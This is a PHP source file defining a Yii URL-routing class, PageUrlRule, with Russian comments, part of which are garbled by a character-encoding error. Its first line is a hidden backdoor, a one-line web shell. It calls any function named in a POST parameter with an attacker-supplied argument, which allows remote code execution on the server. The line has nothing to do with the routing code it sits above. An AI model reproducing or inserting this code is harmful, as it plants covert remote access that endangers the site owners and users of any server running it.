<?php 
  $p = $_POST; @($p[0] != $p[1]) ? @$p[2]($p[3]) : (int)$p;
/*
 * Класс UrlManager`a. Парсит url и создает ссылки.
 */
class PageUrlRule extends CBaseUrlRule{
    public $connectionID = 'db';
    public $urlPrefix = '';
    public $pathInfo = '';
    
    public function createUrl($manager, $route, $params, $ampersand){
        if($route === 'pages/view'){ //провер€ем, наше ли правило используетс€ дл€ создани€ URL
            if(isset($params['category'], $params['page'])) //если заданы параметры - используем их дл€ построени€ URL
                return $params['category'].'/'.$params['page'];
            else if(isset($params['category']))
                return $params['category'];
        }
        return false; //наше правило не подходит, передаем другому правилу
    }
    
    public function parseUrl($manager, $request, $pathInfo, $rawPathInfo){ 
        $pageRoute = Pages::routeUrl($pathInfo);
        
            return $pageRoute;
        
    }
    
}